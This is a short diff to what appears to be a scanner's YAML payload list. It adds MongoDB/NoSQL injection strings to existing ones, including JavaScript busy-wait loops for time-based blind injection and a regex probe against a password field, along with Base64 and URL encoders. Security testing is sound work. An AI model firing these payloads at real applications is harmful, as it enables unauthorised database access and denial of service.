@@ -3,6 +3,10 @@ payload:
   - 'db.injection.insert({success:1});'
   - "true, $where: '99 == 88'"
   - "', $or: [ {}, { 'order':'order"
+  - ";var date = new Date(); do{curDate = new Date();}while(curDate-date"
+  - "a';d = new Date();do{cd=new Date();}while(cd-d"
+  - "0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000)"
+  - "' && this.passwordzz.match(/.*/)//"
 encoder:
   - Base64Flat
   - URL
